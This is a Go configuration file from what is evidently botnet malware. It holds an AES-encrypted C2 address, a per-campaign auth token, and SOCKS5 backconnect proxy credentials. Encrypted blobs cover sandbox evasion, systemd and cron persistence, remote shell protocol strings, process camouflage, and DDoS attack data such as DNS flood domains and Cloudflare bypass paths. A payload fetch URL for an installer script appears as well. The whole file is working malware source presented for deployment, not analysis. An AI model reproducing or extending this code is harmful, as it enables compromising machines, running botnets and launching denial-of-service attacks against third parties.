package main

import (
	"encoding/hex"
	"strings"
	"time"
)

// ============================================================================
// CONFIGURATION
// All tuneable constants and variables live here. setup.py updates this file.
// ============================================================================

// verboseLog enables verbose logging to stdout (set false for production).
var verboseLog = true

// --- Service connection ---

// serviceAddr holds the resolved service address, decoded at runtime from rawServiceAddr.
var serviceAddr string

// configSeed is the 8-char hex seed used for key derivation.
const configSeed = "c3d0dd96" //change me run setup.py

// syncToken is the shared auth token — must match server.
const syncToken = "QCnGuobTR4$uEXze" //change this per campaign

// buildTag must match the server's version string.
const buildTag = "v5.2" //change this per campaign

// retryFloor and retryCeil define the range for randomised reconnection delays.
var retryFloor = 4 * time.Second
var retryCeil = 7 * time.Second

// --- Proxy ---

// proxyUser and proxyPass gate the SOCKS5 proxy interface.
// Default credentials are baked in at build time by setup.py.
// Can be overridden at runtime via !socksauth command.
// Protected by socksCredsMutex for concurrent read/write safety.
var proxyUser = "vision"    //change me run setup.py
var proxyPass = "vision"    //change me run setup.py

// maxSessions caps concurrent proxy connections.
var maxSessions int32 = 100

// relayEndpoints holds pre-configured relay addresses for backconnect SOCKS5.
// Format: "host:port" — bots connect OUT to these relays.
// Leave empty to require explicit relay address via !socks command.
var relayEndpoints []string

// --- Misc ---

// workerPool is the default number of concurrent workers.
var workerPool = 2024

// bufferCap is the standard buffer size for I/O operations.
const bufferCap = 256

// fetchURL is NOT encoded — needs to be easily updated per deployment.
var fetchURL = "http://127.0.0.1/mods/installer.sh"

// ============================================================================
// RUNTIME DATA (AES-128-CTR)
// No plaintext in the binary. Decoded at runtime by initRuntimeConfig().
// setup.py generates a random key per build and re-encrypts all blobs.
// Re-generate with: python3 setup.py
// ============================================================================

// Runtime-decoded values (populated by initRuntimeConfig before use)
var (
	// Sandbox / analysis detection
	sysMarkers   []string
	procFilters  []string
	parentChecks []string

	// Persistence paths
	rcTarget    string
	storeDir    string
	scriptLabel string
	binLabel    string
	unitPath    string
	unitName    string
	unitBody    string
	tmplBody    string
	schedExpr   string
	envLabel    string
	cacheLoc    string
	lockLoc     string

	// Protocol strings
	protoChallenge  string
	protoSuccess    string
	protoRegFmt     string
	protoPing       string
	protoPong       string
	protoOutFmt     string
	protoErrFmt     string
	protoStdoutFmt  string
	protoStderrFmt  string
	protoExitErrFmt string
	protoExitOk     string
	protoInfoFmt    string

	// Response messages
	msgStreamStart  string
	msgBgStart      string
	msgPersistStart string
	msgKillAck      string
	msgSocksErrFmt  string
	msgSocksStartFmt string
	msgSocksStop    string
	msgSocksAuthFmt string

	// DNS / URL infrastructure
	dohServers    []string
	dohFallback   []string
	dohAttack     []string
	resolverPool  []string
	speedTestURL  string
	dnsJsonAccept string

	// Attack fingerprints
	shortUAs        []string
	refererList     []string
	httpPaths       []string
	cfPaths         []string
	cfCookieName    string
	tcpPayload      string
	dnsFloodDomains []string
	alpnH2          string

	// System / camouflage
	camoNames      []string
	shellBin       string
	shellFlag      string
	procPrefix     string
	cmdlineSuffix  string
	pgrepBin       string
	pgrepFlag      string
	devNullPath    string
	systemctlBin   string
	crontabBin     string
	bashBin        string
)

// --- Raw blobs (IV+ciphertext, AES-128-CTR, key = XOR byte functions in opsec.go) ---
// @encrypt:single — setup.py uses these tags to identify vars for re-encryption

var rawServiceAddr, _ = hex.DecodeString("8506a3bcd1baa13cc2a5af0d4e137b159459ba357e4ac24e47f357976befcbed8acb04ff26c4497bde33443e") //change me run setup.py

// @encrypt:slice sysMarkers
var rawSysMarkers, _ = hex.DecodeString("9bfd633c77400a3b920b3cb09de7201208f2e17500945bdc00f2915ceb0cf0f890eed064d2d533aa7e0093fe30f31e95fa2d274fdcf88b674d3f0032799ab082e566bd8e5f2e497936c266363a58068dfc836272915c0df36397e6b7a6b9b494cd27067446c917c09bb1f5b4575c5a61889ca9720c29aa4fba98")
// @encrypt:slice procFilters
var rawProcFilters, _ = hex.DecodeString("30151f580af2e777b77920dc42901b9a698e4bc983afa3b710d7ca5f37b717a9e4b4f13572395d597b830e787bb10c4d5e6850ebb1b7a4ace606b3ad6636cc302914ae9fa978331a43468556c95c249443400089b336b38bd95989f5b3f0e35f0dd1b6280c3d1ac926da45c7adfdfb51bcf6231265df527c27d33b77c0d96607a0f609ea2753fd495ac176525f15fc39fe2b3f228edd19609dd6a7ddac746a27674274b0671298c9781139e192e9f7fd7f618e0f1451c02167d65d87bb7158b5107dd23b1d4e7e53607b59c7e0dade64626d9f9a999fa8dff6d337ed6065167b27d31b224a8c0de7559c23443d32c9b4c0b7b41629b7b8f089aae6ac27af4db5ea0fdfb526dfc80f23fb846c03c19015fd678d75dbd799d0df1234fa08baa033fea955504762dc9ddf70bcdecfdf5d00891cdb6ac0819365a58ef2f17a6b05807d33318b7c11b55b298b1f5b1a9b488d8c206158928b5cbdcc75f2877e419f5e3bf970a66403bd2f115428aef03ad884617221f5270d4ab46ed77af492c2d2d3d986b638b7d3d46f74242c7cd72f9f62017ba903ef673ce9a00261e3fecc915981cb08e2d90126e5089862329af3d38454fa0636632b53fb5fd3b5b4aea30ae0e3c759a3d12241051e8c8f0efe77ca91aaf1e06d5e58a49479698b4753b992573348bbea57fe78d11995cb5bb01e39f671f15dc3726749d4d61f70cd1de584f4193ca26637ff3533f511a9d36464bb59ee9eeceb68e7a564b8265dd2b8bed9d2e0d83ac106fee86ddf989b93670bc37ff9f16a4879da938e8033e04be0efc6aab9666374183f8e4e19634909de93a84ea462e9d33f38e2c89a07bb8fc58fb9e00a4c98c5efe385321e10c8a6e6afbc73f7707bfcae061931465db6ef2ed798f28bee2a915e3aef4071a0261935bbc74ab86436d6ec83b2e1f22d7924e35a2a52b14288c61648fb711b39dca0a26a89cb029a159b3fef89ad938f041434b1e57ddd9c1c599ce83dc9f3acc89fc511999dcd719a036b2deeec49e34eb758d2820be6264ab6da3e19bc235be70c9f4a659bb28e10310d36178543e44c3f651225dab08b1387f1c98536d9b809249fd370cabdbd423882f1e92b80d730d800987c467e0da38da7b5dc39fa736f246b81be325e73a646cc2e7307d7e3")
// @encrypt:slice parentChecks
var rawParentChecks, _ = hex.DecodeString("d8f5a1ed9d75a25d2166cd71a1631cec37e1dbb7e63383448062e5cbd85738fd0a5358d59855b26d46c52e60939750056f70023c228484f1fe6672c172ad073c9506112785974cb30b260443be39ab0b0ed63bc353b2ca2489c93e4d94cc55404ffea0af533f35199e05ce868a4a826f81da53bf1052cc95fd4c1305")

// @encrypt:single rcTarget
var rawRcTarget, _ = hex.DecodeString("9abcb1be8bbc1d6e57c7c4cb8ef0fc49951fbc308a6d06136f4a4c5724")
// @encrypt:single storeDir
var rawStoreDir, _ = hex.DecodeString("04d5ef0cc83d25d6e64190a2273b50cdb99726a052a54a72c91faf3f1ebb3b0da774add889")
// @encrypt:single scriptLabel
var rawScriptLabel, _ = hex.DecodeString("26d44d1c4375b9841adc05724c137f3bf7c1e754fff2e8c1c40acae714933a")
// @encrypt:single binLabel
var rawBinLabel, _ = hex.DecodeString("25e733f5ea59ef1810f8595003692aab2fad09e31e3c7368fabfc271ba")
// @encrypt:single unitPath
var rawUnitPath, _ = hex.DecodeString("e37e51938b185d21e1abcbdb9341708d869b72b25b2a2ad1dbf105408d98d6d890c132bd88a4b2b903eb5964cf53230915c1cffcb1f9f7")
// @encrypt:single unitName
var rawUnitName, _ = hex.DecodeString("4caaaa9fcaf2df60d5c9f8caf470575f6098170b037b612442b09e97ed40d69ed79a69")
// @encrypt:single unitBody
var rawUnitBody, _ = hex.DecodeString("7eba3406807ba8f6f696eb522abae77bd2e3ae53eb04428e4960973224f0735a454e9ca112fcfc0ed7ef82179b80713ca878667e123508a91cf18d53f28e697b449de2836be10aba89ed54573157e2d3bc44b7c25756c25b4d3156765ea189f056d93ccb04756d8a42be78e718bdce1bb4d8879ab6d784470fe4d3613203abde29b7355fecd63e2e0fd1d2e1e8c1a2d8bdb151fdab992b269a2f3f6b655671c31c3915d8937b0f61beb7a1113bcd4562de37de50b1299494107b9c86512d6b054113cc8b2f1357c7bfa13979ab98ab")
// @encrypt:single tmplBody
var rawTmplBody, _ = hex.DecodeString("5077ed0adb5cebe36f002fcf7990431469534db032f586d91bc37df84a21c9f538635490f855d68a70ffc751e0e0b50cf451612299243b86fdef114121d24676ca7091163af81cb619624043787f2c1136ebf804e1a8f2c412b40d9e7953166a98c44216a77feda824dab30d50c8c83e4afad2039be62140a3aa553a11996915bba44bc552b3db3c63fe00daa20b9dc2926c71b9a198b53890766faf8abd333cf1cddf41dca98225e89212b02d89a2e7e8194eaaf360217b61d7f045976852b8b22833101e2e")
// @encrypt:single schedExpr
var rawSchedExpr, _ = hex.DecodeString("f6b08cacb412598beb77df5d6af8eded1684434b40784b1e20")

// @encrypt:single envLabel
var rawEnvLabel, _ = hex.DecodeString("127ab579afdfe67aca49477761839e47149e863b9a6242b9ab250baeaf")
// @encrypt:single cacheLoc
var rawCacheLoc, _ = hex.DecodeString("65c6cf0a65e37212561702049214db1bf3247d9340f504652dd9bee211c8628b")
// @encrypt:single lockLoc
var rawLockLoc, _ = hex.DecodeString("6ff4aed0fdb30e48d6ee7d56a3afb6653c9c8bf14b166fea3bd0d2955f75")

// --- Protocol blobs ---

// @encrypt:single protoChallenge
var rawProtoChallenge, _ = hex.DecodeString("6ded5b4a87dc5005a9da22b0874c58acce3519000890a59d3c1a819944f485")
// @encrypt:single protoSuccess
var rawProtoSuccess, _ = hex.DecodeString("1d41c5dcb4a370cd8dc2eeb0b4d4015590ac89f967beb2b307ab8b54")
// @encrypt:single protoRegFmt
var rawProtoRegFmt, _ = hex.DecodeString("4d400105163280d0537c86c0227d3a08f2f47e927800c392056bcc23c3d3cbd0ad6044c00a5257be4d50ba41d5adde1b")
// @encrypt:single protoPing
var rawProtoPing, _ = hex.DecodeString("6a59b7792ef590821f2ec92d02a2de6fea11915d")
// @encrypt:single protoPong
var rawProtoPong, _ = hex.DecodeString("c8287fc632c03d9a7bd51d50492814f0e8de023b80")
// @encrypt:single protoOutFmt
var rawProtoOutFmt, _ = hex.DecodeString("32744f7b5ed5957ca449c2f55730af20ff10ef18007cf2598490d1c322c004")
// @encrypt:single protoErrFmt
var rawProtoErrFmt, _ = hex.DecodeString("e4f838f45c92b94e21de9d10b8319d4a0e4af262125d5049a1a3")
// @encrypt:single protoStdoutFmt
var rawProtoStdoutFmt, _ = hex.DecodeString("b64a25048f5437e17adb5fb375edeeefa832c0c19ac5915f1ef28c")
// @encrypt:single protoStderrFmt
var rawProtoStderrFmt, _ = hex.DecodeString("974d28d132156883ebe49e47e555ee5cab8206faa180866fdfe3d2")
// @encrypt:single protoExitErrFmt
var rawProtoExitErrFmt, _ = hex.DecodeString("ee04e7592651dbc6cbaaf482251f1f6dface8beee29ebf7480781ad50f038e")
// @encrypt:single protoExitOk
var rawProtoExitOk, _ = hex.DecodeString("5fccf25e637672824f3a717e0d6f5740a396a4168d6520b55e9de35fa82c6c6f44891fece58d1c2dfb377f4349593df98fc834141b")
// @encrypt:single protoInfoFmt
var rawProtoInfoFmt, _ = hex.DecodeString("1c2c8fa9e6d60d1acdc9333d8794249dfca376d84294f683d1")

// --- Response message blobs ---

// @encrypt:single msgStreamStart
var rawMsgStreamStart, _ = hex.DecodeString("724bb5bfea881744a4aa99402d859b902dc9fdefe7d0fdf4547accab980477734fa8")
// @encrypt:single msgBgStart
var rawMsgBgStart, _ = hex.DecodeString("38bf9dd14c6806aa89a8d61db59d5765411edd7e7286aee0561c2da3e6b79f386b57eef19d53b1ab62c35abca051")
// @encrypt:single msgPersistStart
var rawMsgPersistStart, _ = hex.DecodeString("1b741a095c9d7a58c026af9f685961f7eae69ec995e145005589a67bd1bb5f31190ee8d5972de44b21adc4b3")
// @encrypt:single msgKillAck
var rawMsgKillAck, _ = hex.DecodeString("27555f40fa5bf518cd696dfb73e33efceeaabc81b28a892f36bb5e4739ec0f5fd928d5ba359bf18df1cf9424ce18d50c6f2e256e660a122683ef")
// @encrypt:single msgSocksErrFmt
var rawMsgSocksErrFmt, _ = hex.DecodeString("3d02c12960737a9912b5b55660f083a512c83effe6f5fffbee9bb4232633d5c1")
// @encrypt:single msgSocksStartFmt
var rawMsgSocksStartFmt, _ = hex.DecodeString("bf9337b7e67aad148bc47d696c347f28931e117601864a98da01fa3702a2390dd56d76d0727c5a09215e02834e569790")
// @encrypt:single msgSocksStop
var rawMsgSocksStop, _ = hex.DecodeString("bbc47b623ccde525b306bc85aa672e8afe0a983351fa671bf870973f3133d988776444d3b0")
// @encrypt:single msgSocksAuthFmt
var rawMsgSocksAuthFmt, _ = hex.DecodeString("78a1e2497f7ac58614828b9ae11d1a93d9be0ce5ce2a91a0930dfee7cc84ba20a8c6fa9df86c074c1544c85c7f013d")

// --- DNS / URL infrastructure blobs ---

// @encrypt:slice dohServers
var rawDohServers, _ = hex.DecodeString("ff4e1af55dc94e7c9e620ddcc4ab74e6e6b6d50f5109b79ba47f08538e3de8f968f94dfeb6b796789ab6a3c1b050d4d24354137e196868193e945250354161c5bd41c288b0d16e9c2aef32e4587b5c1dab9669b32ee73a2e3748bc5db7c79600da0956e4134bb39004d3c4d0c06a4bf620")
// @encrypt:slice dohFallback
var rawDohFallback, _ = hex.DecodeString("0c41006de4472f443d347e7db766d887b5fc318f8a807a5da4e236525fd7efe95b92a59fc34075d7b4840bf0fc60c97a10b11b76d25a030d044f0a1eb3c7b5a12bcab46d17e2a298e2b57fe5e37b907b03")
// @encrypt:slice dohAttack
var rawDohAttack, _ = hex.DecodeString("0faa365ef1d42585d495f3df723ea53559b9700ed3f0123940adbf8da7e2068cb2010dab1ead43364da8c43af7973e8c1676a6e1b4f0a4cd403586cf9de8eb239007c7544a16ef0a0311457bb266")
// @encrypt:slice resolverPool
var rawResolverPool, _ = hex.DecodeString("54d9ae01231444166cb552338c8e68063d68af19132cd44369ac4f392090cae4fb18c18e5d91d1ff0f89cba8950c5de7add934a4c75afa0b6c8801744ccc161c8cd3b7760ec261414f2e8d3213")
// @encrypt:single speedTestURL
var rawSpeedTestURL, _ = hex.DecodeString("a3aa8931b36f3093abd904bc79ae85628f76434041bf8aa234b50d03542897b858246370238478aaa390b192d4a0a6e361335f942cb3d68786365bbf2e162e")
// @encrypt:single dnsJsonAccept
var rawDnsJsonAccept, _ = hex.DecodeString("dd4fad1335274d4a4afc20f5895a8b03cf4ce5148fee5420ae8ba74c79ce41aebc378a19")

// --- Attack fingerprint blobs ---

// @encrypt:slice shortUAs
var rawShortUAs, _ = hex.DecodeString("82c6f9c6f111a402b01f1f8949ecfbecb36411ed87b1323def868d4e7736ddb62762c61c928eccf97d6faa9428f12008fbaf502ae7c715ed96e6b9c32fd99f897702c16369bc99d1cfb5738e349ef79006e659714df109e43ffde8f7a77d9173f18a5f49f298e605df4dc6f2e19bc4e4fed9f2fd13bf0ea1198f236a73dfeb723d49e1d22c598b0ba9daf4b9f7733f1a667ea645783168f4b30e3c9b885d3a875a452c7b5164c2662f18d6b594a985d9c99a0799e5787d336c8c0e69e039d7e93614089c5cb9bcf50c257b0d90cc973cd9bb852004ce16b3a77e692909")
// @encrypt:slice refererList
var rawRefererList, _ = hex.DecodeString("74313a94843786c01a196eafbd4931d59e1e23afda8b320914c984b521ab3cd0655740be434e7ae767695886782487bbcff3cf81e75c395c47e37e4214db3dc71d1b44232d41a3bfea084bb90c994bfc1b5170dcc5403d02939f4d")
// @encrypt:slice httpPaths
var rawHttpPaths, _ = hex.DecodeString("3ec3e3455451536bd907169440dcffa9538a25dfbacd80fb1ad64b3fac7ff144c1e777dbba7a3a7b1859848e042e191376b1fbe5daa957b01fa123")
// @encrypt:slice cfPaths
var rawCfPaths, _ = hex.DecodeString("575cd780d2b1b333bdea7a1247ff31f9d395e68d8a284700f98deb6b4f5ac3d7d876e123b47df5393b3f732c76e889d6c4ffc0d274f3fa474783a01309a42a59e90cb39eb0537aa0f2")
// @encrypt:single cfCookieName
var rawCfCookieName, _ = hex.DecodeString("41dc6e5fb190f59fe182b4947f608d313781213ce0aab1")
// @encrypt:single tcpPayload
var rawTcpPayload, _ = hex.DecodeString("b50c9742f48a7d50f13baaaf6d3923093deb2d68fb5f0227486bb33ded20b79bb984")
// @encrypt:slice dnsFloodDomains
var rawDnsFloodDomains, _ = hex.DecodeString("12c33459b24482edd405abbe1c921524d1c6880e50c5de4b153b71f2a5f9dcd69a4177640fcef66dee293c0d8760fb8ebbb7d60a6cf95b0517bb929acc21188313e61f9d32e6b1cf8019bc8a4c6247121a5ccc8fd920fc0341c2ff000fbf70")
// @encrypt:single alpnH2
var rawAlpnH2, _ = hex.DecodeString("982f096e34b99f3f00b5fbe3da39f2e766e2")

// @encrypt:slice relayEndpoints
var rawRelayEndpoints, _ = hex.DecodeString("b66b75a095d71b819f5d7c77b66fb7694f79acaef2c4830cdc0d38fcb411065ce069") //change me run setup.py — empty = no pre-configured relays

// --- System / camouflage blobs ---

// @encrypt:slice camoNames
var rawCamoNames, _ = hex.DecodeString("b81c33d5368f4b9e441467fa14bc175bb1b78fd87433a74bd5b9d5d004952ced6e06e1f8a6df8e3a0312400eafa2ce338242cc70b5")
// @encrypt:single shellBin
var rawShellBin, _ = hex.DecodeString("2cb420a2d9f05ce080466e9f311c7e5b43e7")
// @encrypt:single shellFlag
var rawShellFlag, _ = hex.DecodeString("87e25cb9834ad00a99c21df138eeb44fb497")
// @encrypt:single procPrefix
var rawProcPrefix, _ = hex.DecodeString("f37372744bab5c8df17f8f5108bdedc5da9a2f23e439")
// @encrypt:single cmdlineSuffix
var rawCmdlineSuffix, _ = hex.DecodeString("eb7b723ec7e8065b0c7bdd190991c229f5dedc5cbebe294e")
// @encrypt:single pgrepBin
var rawPgrepBin, _ = hex.DecodeString("db6e0bab46f5ad41fd7dae93545637b4e2aba7e82f")
// @encrypt:single pgrepFlag
var rawPgrepFlag, _ = hex.DecodeString("b93e1bd91ae0be68c37b36db3a29e287a310")
// @encrypt:single devNullPath
var rawDevNullPath, _ = hex.DecodeString("59e63d28e3a1b024eeff9a43000f506a9999d3ffb164403be8")
// @encrypt:single systemctlBin
var rawSystemctlBin, _ = hex.DecodeString("d8344d9c5bc147f5763432b22cc6584062b67e1bdf0d6beb09")
// @encrypt:single crontabBin
var rawCrontabBin, _ = hex.DecodeString("a5c4f1d408fb07b5504b2bcce2a1307da261aef39ebf86")
// @encrypt:single bashBin
var rawBashBin, _ = hex.DecodeString("6fd0d9a378cfad4a6752b238afc1a648124d9cea")

// initRuntimeConfig decodes all raw blobs into their runtime variables.
// Must be called once at startup before any code references these values.
func initRuntimeConfig() {
	// Service address (AES layer wrapping the 5-layer obfuscation)
	serviceAddr = string(garuda(rawServiceAddr))

	// Slice values (null-byte separated)
	sysMarkers = strings.Split(string(garuda(rawSysMarkers)), "\x00")
	procFilters = strings.Split(string(garuda(rawProcFilters)), "\x00")
	parentChecks = strings.Split(string(garuda(rawParentChecks)), "\x00")
	resolverPool = strings.Split(string(garuda(rawResolverPool)), "\x00")
	dohServers = strings.Split(string(garuda(rawDohServers)), "\x00")
	dohFallback = strings.Split(string(garuda(rawDohFallback)), "\x00")
	dohAttack = strings.Split(string(garuda(rawDohAttack)), "\x00")
	shortUAs = strings.Split(string(garuda(rawShortUAs)), "\x00")
	refererList = strings.Split(string(garuda(rawRefererList)), "\x00")
	httpPaths = strings.Split(string(garuda(rawHttpPaths)), "\x00")
	cfPaths = strings.Split(string(garuda(rawCfPaths)), "\x00")
	dnsFloodDomains = strings.Split(string(garuda(rawDnsFloodDomains)), "\x00")
	camoNames = strings.Split(string(garuda(rawCamoNames)), "\x00")

	// Persistence paths
	rcTarget = string(garuda(rawRcTarget))
	storeDir = string(garuda(rawStoreDir))
	scriptLabel = string(garuda(rawScriptLabel))
	binLabel = string(garuda(rawBinLabel))
	unitPath = string(garuda(rawUnitPath))
	unitName = string(garuda(rawUnitName))
	unitBody = string(garuda(rawUnitBody))
	tmplBody = string(garuda(rawTmplBody))
	schedExpr = string(garuda(rawSchedExpr))
	envLabel = string(garuda(rawEnvLabel))
	cacheLoc = string(garuda(rawCacheLoc))
	lockLoc = string(garuda(rawLockLoc))

	// Protocol strings
	protoChallenge = string(garuda(rawProtoChallenge))
	protoSuccess = string(garuda(rawProtoSuccess))
	protoRegFmt = string(garuda(rawProtoRegFmt))
	protoPing = string(garuda(rawProtoPing))
	protoPong = string(garuda(rawProtoPong))
	protoOutFmt = string(garuda(rawProtoOutFmt))
	protoErrFmt = string(garuda(rawProtoErrFmt))
	protoStdoutFmt = string(garuda(rawProtoStdoutFmt))
	protoStderrFmt = string(garuda(rawProtoStderrFmt))
	protoExitErrFmt = string(garuda(rawProtoExitErrFmt))
	protoExitOk = string(garuda(rawProtoExitOk))
	protoInfoFmt = string(garuda(rawProtoInfoFmt))

	// Response messages
	msgStreamStart = string(garuda(rawMsgStreamStart))
	msgBgStart = string(garuda(rawMsgBgStart))
	msgPersistStart = string(garuda(rawMsgPersistStart))
	msgKillAck = string(garuda(rawMsgKillAck))
	msgSocksErrFmt = string(garuda(rawMsgSocksErrFmt))
	msgSocksStartFmt = string(garuda(rawMsgSocksStartFmt))
	msgSocksStop = string(garuda(rawMsgSocksStop))
	msgSocksAuthFmt = string(garuda(rawMsgSocksAuthFmt))

	// DNS / URL infrastructure
	speedTestURL = string(garuda(rawSpeedTestURL))
	dnsJsonAccept = string(garuda(rawDnsJsonAccept))

	// Attack fingerprints
	cfCookieName = string(garuda(rawCfCookieName))
	tcpPayload = string(garuda(rawTcpPayload))
	alpnH2 = string(garuda(rawAlpnH2))

	// Relay endpoints (optional — empty blob means none configured)
	if len(rawRelayEndpoints) > 0 {
		relayEndpoints = strings.Split(string(garuda(rawRelayEndpoints)), "\x00")
	}

	// System / camouflage
	shellBin = string(garuda(rawShellBin))
	shellFlag = string(garuda(rawShellFlag))
	procPrefix = string(garuda(rawProcPrefix))
	cmdlineSuffix = string(garuda(rawCmdlineSuffix))
	pgrepBin = string(garuda(rawPgrepBin))
	pgrepFlag = string(garuda(rawPgrepFlag))
	devNullPath = string(garuda(rawDevNullPath))
	systemctlBin = string(garuda(rawSystemctlBin))
	crontabBin = string(garuda(rawCrontabBin))
	bashBin = string(garuda(rawBashBin))
}
